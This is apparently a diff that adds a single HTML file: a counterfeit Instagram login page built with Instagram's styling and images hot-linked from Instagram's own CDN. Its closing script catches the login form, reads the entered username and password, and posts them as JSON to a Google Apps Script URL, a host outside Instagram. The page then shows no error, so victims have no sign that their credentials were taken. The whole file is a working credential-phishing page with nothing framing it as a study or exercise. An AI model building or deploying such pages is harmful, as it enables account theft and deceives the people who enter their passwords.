@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram Login</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        font-family: "Roboto", sans-serif;
+      }
+
+      body {
+        background-color: #fafafa;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 30px;
+        min-height: 100vh;
+      }
+
+      .container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .login-box {
+        background-color: #fff;
+        border: 1px solid #dbdbdb;
+        width: 350px;
+        padding: 40px;
+        margin-bottom: 10px;
+        text-align: center;
+      }
+
+      .logo {
+        width: 175px;
+        margin: 0 auto 30px;
+      }
+
+      form input {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 10px;
+        background: #fafafa;
+        border: 1px solid #dbdbdb;
+        border-radius: 3px;
+      }
+
+      form button {
+        width: 100%;
+        padding: 10px;
+        background-color: #0095f6;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        font-weight: bold;
+        cursor: pointer;
+        margin-top: 10px;
+      }
+
+      .divider {
+        display: flex;
+        align-items: center;
+        margin: 20px 0;
+      }
+
+      .line {
+        flex: 1;
+        height: 1px;
+        background-color: #dbdbdb;
+      }
+
+      .or {
+        margin: 0 15px;
+        font-size: 12px;
+        color: #8e8e8e;
+        font-weight: bold;
+      }
+
+      .facebook-login {
+        color: #385185;
+        font-weight: bold;
+        text-decoration: none;
+        display: block;
+        margin-top: 15px;
+      }
+
+      .forgot {
+        display: block;
+        margin-top: 15px;
+        font-size: 12px;
+        color: #00376b;
+        text-decoration: none;
+      }
+
+      .signup-box {
+        background-color: #fff;
+        border: 1px solid #dbdbdb;
+        width: 350px;
+        padding: 20px;
+        text-align: center;
+        font-size: 14px;
+      }
+
+      .signup-box a {
+        color: #0095f6;
+        font-weight: bold;
+        text-decoration: none;
+      }
+
+      .get-app {
+        margin-top: 20px;
+        text-align: center;
+      }
+
+      .get-app p {
+        margin-bottom: 10px;
+        font-size: 14px;
+      }
+
+      .app-links img {
+        width: 130px;
+        height: auto;
+        margin: 5px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="login-box">
+        <!-- <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo"/> -->
+        <div
+          class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xseo6mj xod5an3 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1"
+        >
+          <i
+            data-visualcompletion="css-img"
+            aria-label="Instagram"
+            class=""
+            role="img"
+            style="
+              background-image: url('https://static.cdninstagram.com/rsrc.php/v4/yB/r/E7m8ZCMOFDS.png');
+              background-position: 0px -52px;
+              background-size: auto;
+              width: 175px;
+              height: 51px;
+              background-repeat: no-repeat;
+              display: inline-block;
+              margin-bottom: 2rem;
+            "
+          ></i>
+        </div>
+        <form id="loginForm">
+          <input type="text" name="username" placeholder="Username" required />
+          <input
+            type="password"
+            name="password"
+            placeholder="Password"
+            required
+          />
+          <button type="submit">Log In</button>
+          <div class="divider">
+            <div class="line"></div>
+            <div class="or">OR</div>
+            <div class="line"></div>
+          </div>
+          <a href="#" class="facebook-login">Log in with Facebook</a>
+          <a href="#" class="forgot">Forgot password?</a>
+        </form>
+      </div>
+      <div class="signup-box">
+        <p>Don't have an account? <a href="#">Sign up</a></p>
+      </div>
+      <div class="get-app">
+        <div class="app-links">
+          <img
+            src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png"
+            alt="Google Play"
+          />
+          <img
+            src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png"
+          />
+        </div>
+      </div>
+    </div>
+
+    <script>
+      const scriptURL =
+        "https://script.google.com/macros/s/AKfycbxUDrMxH5UlQz24bXTOlm2uM61HL5jnrKY2F_ZfGM4MDQBzBYZY5bBYI7nTI9WCnAmu/exec";
+
+      document
+        .getElementById("loginForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+
+          const formData = {
+            username: this.username.value,
+            password: this.password.value,
+          };
+
+          fetch(scriptURL, {
+            method: "POST",
+            body: JSON.stringify(formData),
+          })
+            .then((response) => console.log("a"))
+            .catch((error) => alert("Something went wrong!"));
+        });
+    </script>
+  </body>
+</html>
